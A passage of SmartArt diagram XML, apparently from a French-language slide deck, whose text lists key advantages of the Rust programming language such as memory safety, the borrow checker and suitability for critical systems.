    <dgm:pt modelId="{54A9676C-578A-460F-A077-06E24820DBB4}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A4326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7EFBC8D-65F2-4320-8608-06559E6D194E}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CD2590D2-B1C2-41FC-8FBE-1929A92C7F42}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" presName="parTx" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8A184601-8CF9-45D7-A59E-4C72F563E337}" type="pres">
      <dgm:prSet presAssocID="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" presName="desTx" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{F63D1218-BCBF-4EA4-A465-A8F0520AEB78}" srcId="{2373DEB2-343A-400F-A1F1-5F050D0DB8F5}" destId="{353B2E77-9892-490A-929A-278EA279C5D9}" srcOrd="0" destOrd="0" parTransId="{C02F521C-A1DA-41C5-8627-B12AC24A8B41}" sibTransId="{029FE54A-FAF4-48C3-B816-A793CF68BEAE}"/>
    <dgm:cxn modelId="{9921961D-7956-4ED2-859E-DE0191453888}" type="presOf" srcId="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" destId="{CD2590D2-B1C2-41FC-8FBE-1929A92C7F42}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{23FB2941-9034-44A3-A12F-AE974C0A78CD}" type="presOf" srcId="{2373DEB2-343A-400F-A1F1-5F050D0DB8F5}" destId="{0B431276-5F87-4F41-A4C5-88D1CE2AEABD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{31910844-2A22-442E-A704-8FD70B06C62C}" type="presOf" srcId="{11BF463A-6480-4CA4-845F-94FB05BB0DD3}" destId="{8A184601-8CF9-45D7-A59E-4C72F563E337}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{4F3EEF5A-290B-4148-B2BE-250E7FF86980}" type="presOf" srcId="{B70E5378-9B51-4FCC-A887-83E4AE191247}" destId="{45D492A5-D45F-4288-8D42-60D114A93DCB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{FA46676F-8C0B-4537-923D-479044C152C6}" type="presOf" srcId="{353B2E77-9892-490A-929A-278EA279C5D9}" destId="{C5967B08-6BE5-4F9E-A09D-24A51F8068A9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{11D83883-000A-4AFF-A937-8A5E3BCE7B9F}" type="presOf" srcId="{C03D3B43-F49B-4525-B801-F874A0278027}" destId="{45D492A5-D45F-4288-8D42-60D114A93DCB}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{D4E06FAD-2890-4D1A-A8CF-56C8E013BDEB}" srcId="{353B2E77-9892-490A-929A-278EA279C5D9}" destId="{B70E5378-9B51-4FCC-A887-83E4AE191247}" srcOrd="0" destOrd="0" parTransId="{7144274F-06FE-4DAA-98CB-01F7E7915445}" sibTransId="{77E07BC9-68B1-42EF-BE8C-0A22E22DB5A8}"/>
    <dgm:cxn modelId="{F36D71BC-8791-49E4-B244-9B9EE863A525}" srcId="{2373DEB2-343A-400F-A1F1-5F050D0DB8F5}" destId="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" srcOrd="1" destOrd="0" parTransId="{3B36FF3F-F814-472C-A82E-516678FD63EF}" sibTransId="{E422B26C-CBCC-4B57-9B82-06A846910116}"/>
    <dgm:cxn modelId="{5C09DDD1-6EE0-47EE-8873-8A732DE5BAFD}" srcId="{8F4BD338-B7DF-4D30-8EA4-37B184A43268}" destId="{11BF463A-6480-4CA4-845F-94FB05BB0DD3}" srcOrd="0" destOrd="0" parTransId="{C21AE542-E352-45F2-8397-2FA533D892F7}" sibTransId="{C7899A31-EBFB-4B16-AAC2-FA39F9B35928}"/>
    <dgm:cxn modelId="{430475E9-1442-4575-B87A-7217F51D5304}" srcId="{353B2E77-9892-490A-929A-278EA279C5D9}" destId="{C03D3B43-F49B-4525-B801-F874A0278027}" srcOrd="1" destOrd="0" parTransId="{DDDBDBB9-B938-4FA5-9135-450A214E45DB}" sibTransId="{F300678D-BBDF-4FB7-83EB-6CB341B98775}"/>
    <dgm:cxn modelId="{3322B6E3-BE05-4C5C-9D17-8CA02872F0A8}" type="presParOf" srcId="{0B431276-5F87-4F41-A4C5-88D1CE2AEABD}" destId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{26B84805-64B4-4CA4-B0FF-953D2C4E319F}" type="presParOf" srcId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" destId="{CB60339C-53D5-4ECD-97B5-A0A37A37170B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{08340613-37CC-4777-9242-C593B023E491}" type="presParOf" srcId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" destId="{196EFA6F-14B7-41E2-A96A-9631D5859580}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{0870AF91-F1B9-46EE-8C3D-7F5C05B481B9}" type="presParOf" srcId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" destId="{2CACBD14-839D-4C7E-BFCC-0DDB5DF7200E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{B614191F-9EFF-4564-8087-1B30FD194E48}" type="presParOf" srcId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" destId="{C5967B08-6BE5-4F9E-A09D-24A51F8068A9}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{4A7DD66F-89D1-48AE-BE2E-41BD56423F6E}" type="presParOf" srcId="{AF6506C9-DF58-4F1D-8BF9-4A6D092045AE}" destId="{45D492A5-D45F-4288-8D42-60D114A93DCB}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{EB19C229-704F-434A-BFC4-9614DE9EE46A}" type="presParOf" srcId="{0B431276-5F87-4F41-A4C5-88D1CE2AEABD}" destId="{87774703-3A45-43BF-B2DB-2784E983125F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{0B895D6C-B30B-41EB-9430-792B95C0F813}" type="presParOf" srcId="{0B431276-5F87-4F41-A4C5-88D1CE2AEABD}" destId="{DD69A333-A2F5-4071-B716-B969D7141090}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{09664175-B2E5-4C2F-A884-C0BFB970C463}" type="presParOf" srcId="{DD69A333-A2F5-4071-B716-B969D7141090}" destId="{D670D5F2-20FE-4F3C-93AA-273887601D70}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{A050E2A3-F4C1-4880-94EF-278B19B75801}" type="presParOf" srcId="{DD69A333-A2F5-4071-B716-B969D7141090}" destId="{54A9676C-578A-460F-A077-06E24820DBB4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{5C819A87-6FD8-483B-B7C1-4784E4065286}" type="presParOf" srcId="{DD69A333-A2F5-4071-B716-B969D7141090}" destId="{F7EFBC8D-65F2-4320-8608-06559E6D194E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{2F30C5BB-0321-4361-A8A9-B5AA40695342}" type="presParOf" srcId="{DD69A333-A2F5-4071-B716-B969D7141090}" destId="{CD2590D2-B1C2-41FC-8FBE-1929A92C7F42}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{23075A79-0D40-40E6-B461-8C92983B2B87}" type="presParOf" srcId="{DD69A333-A2F5-4071-B716-B969D7141090}" destId="{8A184601-8CF9-45D7-A59E-4C72F563E33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5C4E830-FE19-4048-A050-2253973C014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C48147-45E9-4832-883F-5E5D2CCD18DD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Avantages clés de Rust :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D4EE35A4-7306-42AB-92C5-34039F968D10}" type="parTrans" cxnId="{33BFC46A-3699-47BD-8E77-8F015C12690D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0CE8B43C-D4E1-43E4-AB1E-42EECE890F42}" type="sibTrans" cxnId="{33BFC46A-3699-47BD-8E77-8F015C12690D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AC9BE222-B437-449B-923E-09CAFA16B0CC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Sécurité mémoire garantie par conception :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{513576C5-75C9-4B4F-9764-23D076594F60}" type="parTrans" cxnId="{8A0747CE-9FF8-43C4-9DA4-566C72C9D9D2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DA68D476-A68C-43DA-AEA0-E5A9729E0AA4}" type="sibTrans" cxnId="{8A0747CE-9FF8-43C4-9DA4-566C72C9D9D2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2D6AC424-CFBE-4C55-9F81-BE499E69195D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Gestion de la mémoire sans </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" i="1"/>
            <a:t>garbage collector</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>, mais avec des règles strictes vérifiées à la compilation (ownership, borrow checker).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8372B24D-5CB1-41B0-9E5B-5F96E7B51FF4}" type="parTrans" cxnId="{097BF464-C616-4952-9F45-0CDFE5DBCCB7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2C3E80DA-EAAD-486B-9E27-06AA2F67F64B}" type="sibTrans" cxnId="{097BF464-C616-4952-9F45-0CDFE5DBCCB7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{822B80F3-1B8B-476B-9FD5-49A5F278457F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Empêche les débordements de tampon et les erreurs de libération de mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D7CA31F2-E1C2-4F4F-A0C4-90A7EBB6DE25}" type="parTrans" cxnId="{5BF9A112-EA8F-4197-B553-2A64AC5AD2AA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{542E0EFA-9D86-4134-BABB-443B981B2A30}" type="sibTrans" cxnId="{5BF9A112-EA8F-4197-B553-2A64AC5AD2AA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DDDAB133-18D5-4C87-97CA-0CFC6C017451}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Abstraction sécurisée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{285AB550-21A7-4CAF-BCCD-FC00ADDC9A48}" type="parTrans" cxnId="{2BD88ED7-E31B-405B-8770-F797698EB07F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1517073E-3959-4B44-85E3-261061AFD411}" type="sibTrans" cxnId="{2BD88ED7-E31B-405B-8770-F797698EB07F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2F296424-542A-4B9F-9C9B-2845C1510611}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Permet d’écrire du code système performant sans sacrifier la sécurité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{337C2245-3E14-4FB4-AA97-49935C214DFB}" type="parTrans" cxnId="{45C36EE8-7503-4B01-9265-279D2486A00C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0A0406FC-2DF2-4517-9CEE-3C7A62506264}" type="sibTrans" cxnId="{45C36EE8-7503-4B01-9265-279D2486A00C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{367DF5FD-F769-4FCA-8117-E1AC61E33D73}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Compatibilité avec les plateformes modernes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5DCB0613-9782-4708-B5C0-D8FC50758343}" type="parTrans" cxnId="{BC6BE366-4C55-4686-9C68-30AD4C2429C5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2856E087-32AF-464C-8B1B-B566573372F4}" type="sibTrans" cxnId="{BC6BE366-4C55-4686-9C68-30AD4C2429C5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{016FF46C-2F1F-4B64-8B5B-B37B3E726D49}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Idéal pour le développement de systèmes critiques, des IoT aux navigateurs (comme dans le cas de Firefox avec Servo).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DF495301-36FC-4061-99E0-83C7C472807D}" type="parTrans" cxnId="{D0233F52-C193-4C43-B7E8-8E2DE39C8102}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E0F30D5-9CEE-4382-8A3B-C207434A1A42}" type="sibTrans" cxnId="{D0233F52-C193-4C43-B7E8-8E2DE39C8102}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" type="pres">
      <dgm:prSet presAssocID="{55C4E830-FE19-4048-A050-2253973C014A}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C4FC4771-2E73-2A4D-9744-730949FF9BAA}" type="pres">
      <dgm:prSet presAssocID="{49C48147-45E9-4832-883F-5E5D2CCD18D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2C657DB-A218-B94C-8CD9-C0EFE6E1CCE6}" type="pres">
      <dgm:prSet presAssocID="{0CE8B43C-D4E1-43E4-AB1E-42EECE890F42}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B958BA47-5F14-2042-98B7-CDFD7EC100B1}" type="pres">
      <dgm:prSet presAssocID="{AC9BE222-B437-449B-923E-09CAFA16B0C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95CB6AC-7413-4E4A-894E-6536CE14E868}" type="pres">
      <dgm:prSet presAssocID="{AC9BE222-B437-449B-923E-09CAFA16B0CC}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B1C33F36-2E04-CE4D-9630-17F354A43E67}" type="pres">
      <dgm:prSet presAssocID="{DDDAB133-18D5-4C87-97CA-0CFC6C01745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364559D-69EB-D342-AAD9-5F583217C067}" type="pres">
      <dgm:prSet presAssocID="{DDDAB133-18D5-4C87-97CA-0CFC6C017451}" presName="childText" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{805B37D1-1AFD-E643-BAD7-099A64F32602}" type="pres">
      <dgm:prSet presAssocID="{367DF5FD-F769-4FCA-8117-E1AC61E33D7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C6F7C15-3700-9849-B4BC-C366B2C20584}" type="pres">
      <dgm:prSet presAssocID="{367DF5FD-F769-4FCA-8117-E1AC61E33D7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30120312-DF16-EF4A-996B-B1E555FB9B3E}" type="presOf" srcId="{AC9BE222-B437-449B-923E-09CAFA16B0CC}" destId="{B958BA47-5F14-2042-98B7-CDFD7EC100B1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5BF9A112-EA8F-4197-B553-2A64AC5AD2AA}" srcId="{AC9BE222-B437-449B-923E-09CAFA16B0CC}" destId="{822B80F3-1B8B-476B-9FD5-49A5F278457F}" srcOrd="1" destOrd="0" parTransId="{D7CA31F2-E1C2-4F4F-A0C4-90A7EBB6DE25}" sibTransId="{542E0EFA-9D86-4134-BABB-443B981B2A30}"/>
    <dgm:cxn modelId="{7F499415-23DF-6241-81A3-0736EFA9B608}" type="presOf" srcId="{2D6AC424-CFBE-4C55-9F81-BE499E69195D}" destId="{395CB6AC-7413-4E4A-894E-6536CE14E868}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{DE11D729-0B26-A546-A22A-75F03660EF92}" type="presOf" srcId="{55C4E830-FE19-4048-A050-2253973C014A}" destId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D0233F52-C193-4C43-B7E8-8E2DE39C8102}" srcId="{367DF5FD-F769-4FCA-8117-E1AC61E33D73}" destId="{016FF46C-2F1F-4B64-8B5B-B37B3E726D49}" srcOrd="0" destOrd="0" parTransId="{DF495301-36FC-4061-99E0-83C7C472807D}" sibTransId="{5E0F30D5-9CEE-4382-8A3B-C207434A1A42}"/>
    <dgm:cxn modelId="{097BF464-C616-4952-9F45-0CDFE5DBCCB7}" srcId="{AC9BE222-B437-449B-923E-09CAFA16B0CC}" destId="{2D6AC424-CFBE-4C55-9F81-BE499E69195D}" srcOrd="0" destOrd="0" parTransId="{8372B24D-5CB1-41B0-9E5B-5F96E7B51FF4}" sibTransId="{2C3E80DA-EAAD-486B-9E27-06AA2F67F64B}"/>
    <dgm:cxn modelId="{915D0966-ABDE-DE44-AAA0-E6A7F0F07382}" type="presOf" srcId="{2F296424-542A-4B9F-9C9B-2845C1510611}" destId="{B364559D-69EB-D342-AAD9-5F583217C067}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{BC6BE366-4C55-4686-9C68-30AD4C2429C5}" srcId="{55C4E830-FE19-4048-A050-2253973C014A}" destId="{367DF5FD-F769-4FCA-8117-E1AC61E33D73}" srcOrd="3" destOrd="0" parTransId="{5DCB0613-9782-4708-B5C0-D8FC50758343}" sibTransId="{2856E087-32AF-464C-8B1B-B566573372F4}"/>
    <dgm:cxn modelId="{33BFC46A-3699-47BD-8E77-8F015C12690D}" srcId="{55C4E830-FE19-4048-A050-2253973C014A}" destId="{49C48147-45E9-4832-883F-5E5D2CCD18DD}" srcOrd="0" destOrd="0" parTransId="{D4EE35A4-7306-42AB-92C5-34039F968D10}" sibTransId="{0CE8B43C-D4E1-43E4-AB1E-42EECE890F42}"/>
    <dgm:cxn modelId="{E6860D8B-0B11-9A4A-B613-CCFC867C0738}" type="presOf" srcId="{016FF46C-2F1F-4B64-8B5B-B37B3E726D49}" destId="{AC6F7C15-3700-9849-B4BC-C366B2C20584}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{91157FA1-4558-BE48-812A-CAC4064DE0F4}" type="presOf" srcId="{49C48147-45E9-4832-883F-5E5D2CCD18DD}" destId="{C4FC4771-2E73-2A4D-9744-730949FF9BAA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{A5C302A2-6068-CC4E-BF59-865CA2680E7C}" type="presOf" srcId="{367DF5FD-F769-4FCA-8117-E1AC61E33D73}" destId="{805B37D1-1AFD-E643-BAD7-099A64F32602}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8A2321AB-E2E8-5F40-BFC8-DC81D6F83D55}" type="presOf" srcId="{DDDAB133-18D5-4C87-97CA-0CFC6C017451}" destId="{B1C33F36-2E04-CE4D-9630-17F354A43E67}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8A0747CE-9FF8-43C4-9DA4-566C72C9D9D2}" srcId="{55C4E830-FE19-4048-A050-2253973C014A}" destId="{AC9BE222-B437-449B-923E-09CAFA16B0CC}" srcOrd="1" destOrd="0" parTransId="{513576C5-75C9-4B4F-9764-23D076594F60}" sibTransId="{DA68D476-A68C-43DA-AEA0-E5A9729E0AA4}"/>
    <dgm:cxn modelId="{2BD88ED7-E31B-405B-8770-F797698EB07F}" srcId="{55C4E830-FE19-4048-A050-2253973C014A}" destId="{DDDAB133-18D5-4C87-97CA-0CFC6C017451}" srcOrd="2" destOrd="0" parTransId="{285AB550-21A7-4CAF-BCCD-FC00ADDC9A48}" sibTransId="{1517073E-3959-4B44-85E3-261061AFD411}"/>
    <dgm:cxn modelId="{19B192D9-3F1D-FD4B-99D1-3C29E5309D65}" type="presOf" srcId="{822B80F3-1B8B-476B-9FD5-49A5F278457F}" destId="{395CB6AC-7413-4E4A-894E-6536CE14E868}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{45C36EE8-7503-4B01-9265-279D2486A00C}" srcId="{DDDAB133-18D5-4C87-97CA-0CFC6C017451}" destId="{2F296424-542A-4B9F-9C9B-2845C1510611}" srcOrd="0" destOrd="0" parTransId="{337C2245-3E14-4FB4-AA97-49935C214DFB}" sibTransId="{0A0406FC-2DF2-4517-9CEE-3C7A62506264}"/>
    <dgm:cxn modelId="{B143540D-4889-CD44-86A8-4BE606A2B3CA}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{C4FC4771-2E73-2A4D-9744-730949FF9BAA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E968A907-F4C6-814B-A72A-E06796EBB9CE}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{52C657DB-A218-B94C-8CD9-C0EFE6E1CCE6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7EED965F-9B86-F648-BBDB-A6B112548E77}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{B958BA47-5F14-2042-98B7-CDFD7EC100B1}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{FE63F5CC-7C16-6D42-9782-91D8F2481087}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{395CB6AC-7413-4E4A-894E-6536CE14E868}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{C77E62CD-5FCE-2E41-92E1-872303EB6C20}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{B1C33F36-2E04-CE4D-9630-17F354A43E67}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{69CF91A1-234A-434C-A903-034C5A800BBE}" type="presParOf" srcId="{741FB7A7-D9C0-3F4B-92DC-2FADB7F177E5}" destId="{B364559D-69EB-D342-AAD9-5F583217C067}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
